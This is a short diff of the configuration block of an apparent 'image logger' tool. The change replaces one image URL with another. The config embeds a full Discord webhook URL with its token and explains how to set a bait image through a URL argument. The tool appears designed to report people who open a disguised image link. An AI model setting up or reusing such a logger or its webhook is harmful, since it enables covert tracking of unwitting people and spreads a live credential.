@@ -13,7 +13,7 @@ __author__ = "OFFWHITE"
 config = {
     # BASE CONFIG #
     "webhook": "https://discordapp.com/api/webhooks/1342209246376497234/zsMb79XvIn7hP1D3GgIZU4jQ6bIWAji8KcR2HoiQ6roaCYO7a2ykRe8EaToj5Ls8Qeyp",
-    "image": "https://i.pinimg.com/736x/4c/d5/ae/4cd5aea553a35d93448dba2b9a26326b.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://i.pinimg.com/736x/55/33/2e/55332e886e3df9afbae307b96a022580.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
